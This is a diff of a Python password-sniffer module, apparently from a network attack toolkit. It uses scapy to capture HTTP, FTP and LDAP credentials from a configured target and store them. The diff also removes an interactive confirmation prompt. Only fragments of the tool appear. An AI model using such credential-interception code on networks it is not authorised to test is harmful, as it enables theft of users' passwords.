@@ -3,26 +3,32 @@ from collections import namedtuple
 from sniffer import Sniffer
 from password_parser import parse_pkt
 from scapy.all import *
+from util import Msg
 
 
 class password_sniffer(Sniffer):
-    """ Sniff and parse passwords from various protocols """
     def __init__(self):
+        super(password_sniffer, self).__init__('Password Sniffer')
         self.passwords = {}    # $host -> [(user, pass, service)]
         self.purgatory = {}  # $host -> {$dport:[user, pass, service]}
-        super(password_sniffer, self).__init__('Password Sniffer')
+        self.info = """
+                    The password sniffer module attempts to sniff passwords
+                    from various services coming across the wire.  This module
+                    currently supports:
+                        [*] HTTP
+                        [*] FTP
+                        [*] LDAP
+
+                    More protocols are being developed, though pull requests are
+                    welcome :)"""
 
     def initialize(self):
         """ initialize sniffer """
-        self.get_ip()
-        tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '
-                                                                % self.source)
-        if 'n' in tmp.lower():
-            return None
-
-        self.sniff_filter = "src %s" % self.source
+        self.sniff_filter = "src %s" % self.config['target'].value
+        print self.sniff_filter
         self.run()
-        return self.source
+        Msg("Starting password sniffer...")
+        return True
 
     def dump(self, pkt):
         """Packet callback"""
@@ -109,7 +115,7 @@ class password_sniffer(Sniffer):
 
         # update database
         self._dbcredentials(entry[0], entry[1],
-                            entry[2].split(':')[0], self.source)
+                        entry[2].split(':')[0], self.config['target'].value)
 
     def view(self):
         """ Iterate through all usernames/passwords
